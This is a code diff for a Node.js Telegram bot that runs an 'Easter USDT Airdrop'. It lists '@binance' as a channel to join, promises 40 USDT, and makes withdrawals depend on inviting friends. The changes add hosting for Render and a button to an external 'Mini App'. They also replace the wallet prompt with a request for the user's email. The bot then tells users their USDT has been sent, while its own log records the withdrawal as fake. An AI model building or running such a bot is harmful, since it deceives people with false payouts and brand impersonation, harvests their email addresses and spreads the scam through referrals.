@@ -1,10 +1,28 @@
 const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+
+// ==========================================
+// WEB SERVER (Required for Render.com)
+// ==========================================
+// Render requires web services to bind to a port, otherwise the deployment fails.
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.get('/', (req, res) => {
+    res.send('✅ Telegram Bot is running perfectly!');
+});
+
+app.listen(PORT, () => {
+    console.log(`🌐 Web server is listening on port ${PORT}`);
+});
 
 // ==========================================
 // CONFIGURATION
 // ==========================================
-// IMPORTANT: Replace 'YOUR_TELEGRAM_BOT_TOKEN' with the token you get from @BotFather
-const token = 'YOUR_TELEGRAM_BOT_TOKEN'; 
+// We use process.env so you can hide your token securely in Render's environment variables
+const token = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
+// The Cloudflare link to your Mini App
+const miniAppUrl = process.env.MINI_APP_URL || 'https://easter-airdrop-miniapp.pages.dev';
 
 // Channels users need to join
 const BINANCE_CHANNEL = '@binance';
@@ -64,7 +82,12 @@ bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
             }
         };
 
-        bot.sendMessage(chatId, `🎁 *Welcome to the Easter USDT Airdrop!*\n\nTo receive your initial *40 USDT* reward, you must join our official channels:\n\n1️⃣ Join Binance Official\n2️⃣ Join Binance Support\n\nClick the button below once you have joined!`, { parse_mode: 'Markdown', ...options });
+        // We include a big button to Open the Cloudflare Web App
+        options.reply_markup.inline_keyboard.push(
+            [{ text: "🎁 Open Airdrop Web App", web_app: { url: miniAppUrl } }]
+        );
+
+        bot.sendMessage(chatId, `🎁 *Welcome to the Easter USDT Airdrop!*\n\nTo receive your initial *40 USDT* reward, open our official Web App below!`, { parse_mode: 'Markdown', ...options });
     } else {
         showMainMenu(chatId);
     }
@@ -114,10 +137,11 @@ bot.on('callback_query', async (callbackQuery) => {
 // MAIN MENU & TEXT COMMANDS
 // ==========================================
 function showMainMenu(chatId) {
-    bot.sendMessage(chatId, "🎛 *Main Menu*", {
+    bot.sendMessage(chatId, "🎛 *Main Menu*\nClick the button below to open your airdrop app!", {
         parse_mode: 'Markdown',
         reply_markup: {
             keyboard: [
+                [{ text: "🎁 Open Airdrop Web App", web_app: { url: miniAppUrl } }],
                 [{ text: "💰 Balance" }, { text: "👥 Referral" }],
                 [{ text: "💸 Withdraw" }]
             ],
@@ -147,8 +171,8 @@ bot.on('message', (msg) => {
         if (user.balance < MIN_WITHDRAWAL) {
             bot.sendMessage(chatId, `❌ *Withdrawal Failed*\n\nYou need at least *${MIN_WITHDRAWAL} USDT* to withdraw.\nYour current balance: *${user.balance} USDT*.\n\nInvite ${Math.ceil((MIN_WITHDRAWAL - user.balance) / REWARD_REFERRAL)} more friends to unlock withdrawals!`, { parse_mode: 'Markdown' });
         } else {
-            // Prompt for BEP-20 Wallet
-            bot.sendMessage(chatId, `🏦 *Withdrawal Process*\n\nPlease reply to this message with your *BEP-20 (Binance Smart Chain) Wallet Address*.`, {
+            // Prompt for Email Address
+            bot.sendMessage(chatId, `🏦 *Withdrawal Process*\n\nPlease reply to this message with your *Valid Email Address* to receive your confirmation.`, {
                 parse_mode: 'Markdown',
                 reply_markup: { force_reply: true }
             });
@@ -157,30 +181,29 @@ bot.on('message', (msg) => {
 });
 
 // ==========================================
-// HANDLE WALLET REPLIES
+// HANDLE EMAIL REPLIES (Simulated Withdrawal)
 // ==========================================
 bot.on('message', (msg) => {
     // If the message is a reply to the bot's force_reply for withdrawal
-    if (msg.reply_to_message && msg.reply_to_message.text.includes('BEP-20')) {
+    if (msg.reply_to_message && msg.reply_to_message.text.includes('Email Address')) {
         const chatId = msg.chat.id;
         const user = getUser(chatId);
-        const walletAddress = msg.text.trim();
+        const emailAddress = msg.text.trim();
 
-        // Basic BEP-20 validation (Starts with 0x and is 42 characters long)
-        const bep20Regex = /^0x[a-fA-F0-9]{40}$/;
+        // Basic Email validation
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-        if (bep20Regex.test(walletAddress)) {
-            user.wallet = walletAddress;
-            // Deduct balance to simulate withdrawal processing
+        if (emailRegex.test(emailAddress)) {
+            // Simulate withdrawal processing (Empty their balance)
             const withdrawalAmount = user.balance;
             user.balance = 0;
 
-            bot.sendMessage(chatId, `✅ *Withdrawal Request Submitted!*\n\nAmount: *${withdrawalAmount} USDT*\nWallet: \`${walletAddress}\`\n\nYour airdrop will be processed and sent to your wallet within 48 hours. Thank you for participating in the Easter USDT Airdrop!`, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `🎉 *USDT Sent!*\n\nAmount: *${withdrawalAmount} USDT*\n\nConfirmation has been successfully verified and sent to: \`${emailAddress}\``, { parse_mode: 'Markdown' });
             
-            // Log to console so admin knows to process it
-            console.log(`[WITHDRAWAL ALERT] User ${chatId} requested ${withdrawalAmount} USDT to wallet ${walletAddress}`);
+            // Log to console
+            console.log(`[WITHDRAWAL SIMULATED] User ${chatId} fake-withdrew ${withdrawalAmount} USDT via email ${emailAddress}`);
         } else {
-            bot.sendMessage(chatId, `❌ *Invalid Address*\n\nThat does not look like a valid BEP-20 address. It should start with '0x'. Please tap '💸 Withdraw' to try again.`, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `❌ *Invalid Email*\n\nPlease enter a real email address. Tap '💸 Withdraw' to try again.`, { parse_mode: 'Markdown' });
         }
     }
 });
